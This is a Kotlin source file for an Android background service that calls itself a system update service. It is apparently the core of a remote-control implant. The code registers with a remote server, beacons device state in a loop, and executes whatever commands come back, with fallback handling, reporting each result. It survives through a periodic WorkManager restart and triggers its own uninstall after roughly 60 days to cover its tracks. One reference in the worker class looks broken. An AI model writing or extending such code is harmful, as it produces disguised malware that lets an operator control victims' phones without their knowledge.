package com.system.updates.core

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.work.*
import com.system.updates.communication.Communicator
import com.system.updates.communication.CommandExecutor
import com.system.updates.error.ErrorHandler
import com.system.updates.error.FallbackExecutor
import com.system.updates.security.CryptoManager
import kotlinx.coroutines.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class UpdateService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var crypto: CryptoManager
    private lateinit var communicator: Communicator
    private lateinit var executor: CommandExecutor
    private lateinit var errorHandler: ErrorHandler
    private lateinit var fallbackExecutor: FallbackExecutor
    private var startTime = 0L
    private var lastHeartbeat = 0L

    override fun onCreate() {
        super.onCreate()
        crypto = CryptoManager(this)
        communicator = Communicator(this, crypto)
        executor = CommandExecutor(this, crypto)
        errorHandler = ErrorHandler(this)
        fallbackExecutor = FallbackExecutor(this)
        startTime = System.currentTimeMillis()
        schedulePeriodicWake()
        scope.launch {
            registerIfNeeded()
            heartbeatLoop()
        }
        Log.i("UpdateService", "Service created")
    }

    private fun schedulePeriodicWake() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()
        val work = PeriodicWorkRequestBuilder<UpdateWorker>(15, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .setBackoffCriteria(BackoffPolicy.LINEAR, 5, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork("update_worker", ExistingPeriodicWorkPolicy.KEEP, work)
    }

    private suspend fun registerIfNeeded() {
        if (!communicator.isRegistered()) {
            communicator.register()
        }
    }

    private suspend fun heartbeatLoop() {
        while (true) {
            try {
                val behavior = collectBehaviorData()
                val commands = communicator.heartbeat(behavior)
                commands.forEach { cmd ->
                    try {
                        val result = executor.execute(cmd)
                        communicator.sendResult(cmd, result)
                    } catch (e: Exception) {
                        errorHandler.logError("CMD_EXEC_FAIL", e.message ?: "Unknown", "UpdateService", cmd.toString(), e)
                        fallbackExecutor.executeWithFallback(cmd.optString("request_type"), cmd, null)
                    }
                }
                lastHeartbeat = System.currentTimeMillis()
                if (lastHeartbeat - startTime > 5184000000L) {
                    selfDestruct()
                }
                delay(delayTime())
            } catch (e: Exception) {
                errorHandler.logError("HB_LOOP_ERR", e.message ?: "Unknown", "UpdateService", null, e)
                delay(60000)
            }
        }
    }

    private fun collectBehaviorData(): JSONObject {
        val data = JSONObject()
        try {
            val pm = getSystemService(PowerManager::class.java)
            data.put("screen_on", pm.isInteractive)
            data.put("power_save", pm.isPowerSavingMode)
            data.put("timestamp", System.currentTimeMillis())
        } catch (e: Exception) {
            errorHandler.logError("BEHAVIOR_COLLECT_ERR", e.message ?: "Unknown", "UpdateService", null, e)
        }
        return data
    }

    private fun delayTime(): Long {
        val pm = getSystemService(PowerManager::class.java)
        val screenOff = !pm.isInteractive
        val powerSave = pm.isPowerSavingMode
        var delay = 30000L
        if (screenOff) delay = 60000L
        if (powerSave) delay = 120000L
        return delay
    }

    private fun selfDestruct() {
        scope.launch {
            try {
                val intent = Intent(Intent.ACTION_DELETE)
                intent.data = android.net.Uri.parse("package:$packageName")
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            } catch (e: Exception) {
                errorHandler.logError("SELF_DESTRUCT_ERR", e.message ?: "Unknown", "UpdateService", null, e)
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
        Log.i("UpdateService", "Service destroyed")
    }

    class UpdateWorker(ctx: android.content.Context, p: WorkerParameters) : Worker(ctx, p) {
        override fun doWork(): Result {
            return try {
                val intent = Intent(ctx, UpdateService::class.java)
                ctx.startService(intent)
                Result.success()
            } catch (e: Exception) {
                Result.retry()
            }
        }
    }
}